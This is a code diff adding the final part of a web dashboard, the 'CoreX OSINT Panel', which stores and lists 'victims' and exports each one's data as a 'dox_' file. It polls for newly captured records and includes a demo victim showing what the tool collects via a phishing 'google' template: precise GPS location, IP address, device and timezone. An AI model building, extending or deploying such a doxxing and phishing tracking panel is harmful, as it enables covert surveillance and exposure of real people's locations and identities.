+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `dox_${currentVictim.name}_${Date.now()}.txt`;
+            a.click();
+            
+            addTerminal('[EXPORT] Data exported');
+        }
+
+        function clearData() {
+            if (confirm('Hapus semua data?')) {
+                victims = [];
+                localStorage.removeItem('corex_victims');
+                updateVictimList();
+                updateStats();
+                addTerminal('[SYSTEM] All data cleared');
+            }
+        }
+
+        function refreshData() {
+            updateVictimList();
+            updateStats();
+            addTerminal('[SYSTEM] Data refreshed');
+        }
+
+        // Initialize
+        updateVictimList();
+        updateStats();
+        addTerminal('[SYSTEM] CoreX OSINT Panel ready');
+
+        // Auto refresh tiap 5 detik
+        setInterval(() => {
+            // Cek data baru (simulasi)
+            const temp = localStorage.getItem('temp_victim');
+            if (temp) {
+                try {
+                    const data = JSON.parse(temp);
+                    addVictim(data);
+                    localStorage.removeItem('temp_victim');
+                } catch(e) {}
+            }
+            
+            // Update live count random
+            document.getElementById('liveCount').innerText = victims.filter(v => v.online).length || Math.floor(Math.random() * 3);
+        }, 3000);
+
+        // Simulate receiving victim (for demo)
+        // Hapus ini di production
+        setTimeout(() => {
+            if (victims.length === 0) {
+                // Demo data
+                const demo = {
+                    target: 'Budi Test',
+                    template: 'google',
+                    location: {
+                        lat: -6.2088 + (Math.random()-0.5)*0.1,
+                        lng: 106.8456 + (Math.random()-0.5)*0.1,
+                        accuracy: 5 + Math.random()*10
+                    },
+                    device: {
+                        ip: '114.125.12.' + Math.floor(Math.random()*255),
+                        userAgent: 'Mozilla/5.0 (Android)',
+                        platform: 'Android',
+                        timezone: 'Asia/Jakarta'
+                    },
+                    timestamp: Date.now()
+                };
+                // addVictim(demo);
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
